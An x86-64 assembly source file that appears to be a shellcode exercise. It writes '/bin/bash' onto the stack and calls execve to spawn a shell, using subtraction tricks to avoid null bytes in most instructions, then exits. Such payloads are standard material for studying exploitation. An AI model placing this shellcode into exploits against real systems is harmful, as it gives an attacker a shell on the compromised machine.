    .section    .text
_start:
    sub $0xe, %rsp
    movb $0x2f, 0x0(%rsp)
    movb $0x62, 0x1(%rsp)
    movb $0x69, 0x2(%rsp)
    movb $0x6e, 0x3(%rsp)
    movb $0x2f, 0x4(%rsp)
    movb $0x62, 0x5(%rsp)
    movb $0x61, 0x6(%rsp)
    movb $0x73, 0x7(%rsp)
    movb $0x68, 0x8(%rsp)
    mov $0x01010101, %rcx
    sub $0x01010101, %rcx
    mov  %rcx,  0x9(%rsp)
    
    mov  %rcx,  0x18(%rsp)
    mov  %rsp,  0x10(%rsp)
    lea  0x18(%rsp), %rdx
    lea  0x10(%rsp), %rsi
    mov %rsp, %rdi
    mov $0x0101013c, %rax
    sub $0x01010101, %rax
    syscall

    add $0xe, %rsp
    mov $0x0, %rdi
    mov $0x3c, %rax
    syscall
    .global        _start
    .end
